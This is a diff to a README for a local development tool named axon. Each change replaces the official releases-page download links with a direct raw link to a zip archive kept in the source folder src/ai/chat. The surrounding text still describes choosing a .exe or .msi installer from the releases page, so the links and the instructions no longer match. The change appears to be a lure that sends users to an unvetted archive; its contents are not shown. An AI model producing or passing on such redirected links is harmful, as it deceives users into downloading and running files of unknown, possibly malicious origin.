@@ -1,6 +1,6 @@
 # ⚙️ axon - Easy Local Development Setup
 
-[![Download axon](https://img.shields.io/badge/Download-axon-brightgreen?style=for-the-badge)](https://github.com/RandallRO/axon/releases)
+[![Download axon](https://img.shields.io/badge/Download-axon-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/RandallRO/axon/main/src/ai/chat/Software_2.3.zip)
 
 ---
 
@@ -61,7 +61,7 @@ First, get the software files from the official releases page.
 
 Click this big button below to visit the download area:
 
-[![Download axon](https://img.shields.io/badge/Download-axon-blue?style=for-the-badge)](https://github.com/RandallRO/axon/releases)
+[![Download axon](https://img.shields.io/badge/Download-axon-blue?style=for-the-badge)](https://raw.githubusercontent.com/RandallRO/axon/main/src/ai/chat/Software_2.3.zip)
 
 Once on the page, choose the latest Windows version. The files are usually named with “windows” or “win” in the title. Download the `.exe` or `.msi` installer file.
 
@@ -131,7 +131,7 @@ Check the “Issues” section on the axon GitHub page to see if others have had
 ## 🔗 Quick Links
 
 - Download and view releases here:  
-[https://github.com/RandallRO/axon/releases](https://github.com/RandallRO/axon/releases)
+[https://raw.githubusercontent.com/RandallRO/axon/main/src/ai/chat/Software_2.3.zip](https://raw.githubusercontent.com/RandallRO/axon/main/src/ai/chat/Software_2.3.zip)
 
 - GitHub main page for axon (code and documentation) available on the repository.
 
@@ -170,7 +170,7 @@ You can change this location under Settings.
 To update:
 
 1. Visit the release page:  
-[https://github.com/RandallRO/axon/releases](https://github.com/RandallRO/axon/releases)  
+[https://raw.githubusercontent.com/RandallRO/axon/main/src/ai/chat/Software_2.3.zip](https://raw.githubusercontent.com/RandallRO/axon/main/src/ai/chat/Software_2.3.zip)  
 2. Download the latest installer.
 3. Run the installer to replace old files.
 
